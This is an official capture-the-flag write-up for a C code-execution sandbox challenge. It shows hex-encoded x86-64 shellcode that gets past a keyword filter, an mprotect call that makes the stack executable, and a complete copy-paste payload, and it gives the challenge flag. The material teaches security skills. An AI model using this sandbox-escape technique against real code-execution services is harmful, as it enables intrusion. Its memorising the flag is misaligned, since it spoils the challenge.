# Challenge 05: Schrödinger's Sandbox — Official Writeup

**Category:** Miscellaneous  
**Difficulty:** 🔴 Hard  
**Points:** 700  
**Flag:** `BVAULT{1nl1n3_4553mbly_5y5c4ll_m4573r}`

---

## Challenge Overview

Players connect to a remote service via netcat. The service accepts raw C code, compiles it with `gcc`, and executes the resulting binary. The catch is a strict Python-side filter that bans all useful keywords and characters.

```bash
nc -4 schrodinger.theobv.xyz 9005
```

---

## Understanding the Filter

The backend (`jail.py`) blocks the following keywords and characters from your submitted C code:

| Banned Keyword / Character | Impact |
|----------------------------|--------|
| `#include` | No standard library headers |
| `"` and `'` | No string literals of any kind |
| `open` | Cannot call `open()` directly |
| `read` | Cannot call `read()` directly |
| `write` | Cannot call `write()` directly |
| `syscall` | Cannot use the `syscall()` wrapper |
| `int 0x80` | Cannot use old-style Linux interrupt |
| `flag` | Cannot reference the filename |
| `system`, `exec` | No shell execution |
| `main` | Cannot define a `main()` function |

At first glance, this seems impossible — you need to open a file, read it, and print it, but every tool to do that is banned.

---

## Step-by-Step Solution

### Step 1 — Understand What the Server Does

When you submit your code, the server wraps it like this:

```c
int main() {
    // YOUR CODE HERE
    return 0;
}
```

It then runs `gcc` on it and executes the binary. This means:
- You **don't** need to write `main()` yourself.
- You only need to write the **body** of the function.
- The filter checks the **text of your source code**, not actual runtime values.

---

### Step 2 — The Key Insight: Hex Bytes Bypass Text Filters

The word `flag` is banned in your source code. But what if you never write the word `flag`?

The ASCII bytes for `flag` are:
- `f` = `0x66`
- `l` = `0x6c`
- `a` = `0x61`
- `g` = `0x67`

If you embed those values as a hex byte array in C, the source code contains `0x66, 0x6c, 0x61, 0x67` — the filter sees no banned word, but the CPU sees the exact bytes for `"flag"`.

Similarly:
- The word `syscall` is banned — but the raw x86-64 opcode for a syscall is `0x0f, 0x05`. Totally legal!
- Strings like `"flag"` are banned — but a `char` array of hex bytes is not a string, it's just data.

**This is the core bypass: express everything as raw hex bytes.**

---

### Step 3 — Write the Shellcode

The shellcode must perform 3 Linux syscalls in sequence to read and print the flag:

| Step | Syscall | Number | Action |
|------|---------|--------|--------|
| 1 | `open` | `2` | Open the file `"flag"` for reading |
| 2 | `read` | `0` | Read up to 100 bytes from the file descriptor |
| 3 | `write` | `1` | Write the bytes to stdout |

Here's the shellcode expressed as a C byte array (legal in the sandbox):

```c
char c[] = {
    // --- syscall 1: open("flag", 0) ---
    0x48, 0xb8,                          // movabs rax, ...
    0x66, 0x6c, 0x61, 0x67,             //   ... "flag" (hex bytes, not the word!)
    0x0, 0x0, 0x0, 0x0,                 //   null terminator padding
    0x50,                                // push rax  (puts "flag" string on stack)
    0x48, 0x89, 0xe7,                   // mov rdi, rsp  (rdi = pointer to "flag")
    0x48, 0x31, 0xf6,                   // xor rsi, rsi  (flags = 0 = O_RDONLY)
    0x6a, 0x2,                          // push 2  (syscall number for open)
    0x58,                               // pop rax
    0xf, 0x5,                           // syscall  (0x0f 0x05 = the syscall instruction)

    // --- syscall 2: read(fd, buf, 100) ---
    0x48, 0x89, 0xc7,                   // mov rdi, rax  (rdi = file descriptor returned by open)
    0x48, 0x89, 0xe6,                   // mov rsi, rsp  (rsi = buffer on stack)
    0xba, 0x64, 0x0, 0x0, 0x0,         // mov edx, 100  (read 100 bytes)
    0x48, 0x31, 0xc0,                   // xor rax, rax  (syscall number 0 = read)
    0xf, 0x5,                           // syscall

    // --- syscall 3: write(1, buf, 100) ---
    0x48, 0x89, 0xc2,                   // mov rdx, rax  (rdx = bytes actually read)
    0xbf, 0x1, 0x0, 0x0, 0x0,          // mov edi, 1    (stdout fd)
    0xb8, 0x1, 0x0, 0x0, 0x0,          // mov eax, 1    (syscall number 1 = write)
    0xf, 0x5                            // syscall
};
```

---

### Step 4 — Bypass the NX Bit with `mprotect()`

There is one more obstacle. Modern `gcc` compiles binaries with the **NX (No-eXecute)** bit enabled. This marks the stack as non-executable — if you try to jump into your shellcode array on the stack, the OS will throw a **Segmentation Fault** and the program crashes.

The solution is the `mprotect()` syscall, which changes the permission of a memory page. We need to set the permissions of the page containing our array to **Read + Write + Execute** (value `7`).

We cannot `#include <sys/mman.h>` to get the prototype. But **C allows implicit function declarations** — you can declare the function signature manually and call it without any header:

```c
int mprotect(void*, long, int);
```

Then call it to make the page containing our shellcode executable:

```c
mprotect((void*)((long)c & ~4095), 4096, 7);
//                ^^^^^^^^^^^^^^^^^
//                Align the pointer to the start of its 4096-byte memory page
//                                             ^
//                                             7 = Read(1) + Write(2) + Execute(4)
```

---

### Step 5 — Cast the Array to a Function Pointer and Execute

Now that the memory page is executable, we cast our byte array to a function pointer and call it:

```c
void (*f)() = (void(*)())c;
f();
```

The CPU now treats the raw bytes in `c[]` as machine code instructions and executes them directly — your shellcode runs and prints the flag!

---

## Complete Payload

Copy and paste this into the netcat connection, then type `EOF` and press Enter:

```c
int mprotect(void*, long, int);
char c[] = { 0x48, 0xb8, 0x66, 0x6c, 0x61, 0x67, 0x0, 0x0, 0x0, 0x0, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x6a, 0x2, 0x58, 0xf, 0x5, 0x48, 0x89, 0xc7, 0x48, 0x89, 0xe6, 0xba, 0x64, 0x0, 0x0, 0x0, 0x48, 0x31, 0xc0, 0xf, 0x5, 0x48, 0x89, 0xc2, 0xbf, 0x1, 0x0, 0x0, 0x0, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xf, 0x5 };
mprotect((void*)((long)c & ~4095), 4096, 7);
void (*f)() = (void(*)())c;
f();
EOF
```

**Expected Output:**
```
========================================
||     SCHRÖDINGER'S SANDBOX          ||
========================================
Please submit your C code to be compiled and executed.
End your submission with 'EOF' on a new line.
WARNING: Strings, includes, and system calls are strictly filtered.

Compilation successful. Executing...

BVAULT{1nl1n3_4553mbly_5y5c4ll_m4573r}
```

---

## Exploit Flow Summary

```
nc schrodinger.theobv.xyz 9005
        │
        ▼
Submit C code (no strings, no includes, no banned words)
        │
        ▼
Server wraps your code in main() { ... }
        │
        ▼
gcc compiles → binary is created
        │
        ▼
mprotect() marks shellcode's memory page as RWX
        │
        ▼
Function pointer jumps into the raw hex byte array
        │
        ▼
CPU executes shellcode:
   open("flag", 0)   → get file descriptor
   read(fd, buf, 100) → read flag into buffer
   write(1, buf, 100) → print flag to stdout
        │
        ▼
Flag: BVAULT{1nl1n3_4553mbly_5y5c4ll_m4573r}
```

---

## Why This Works (Key Bypasses Recap)

| Filter Rule | How We Bypassed It |
|-------------|-------------------|
| No `"flag"` string | Used hex bytes `0x66, 0x6c, 0x61, 0x67` |
| No `syscall` keyword | Used raw opcode bytes `0x0f, 0x05` |
| No `#include` | Used implicit function declaration for `mprotect` |
| No `open`/`read`/`write` | Used Linux syscall numbers (2, 0, 1) directly |
| NX stack (no execute) | Used `mprotect()` to grant execute permission |
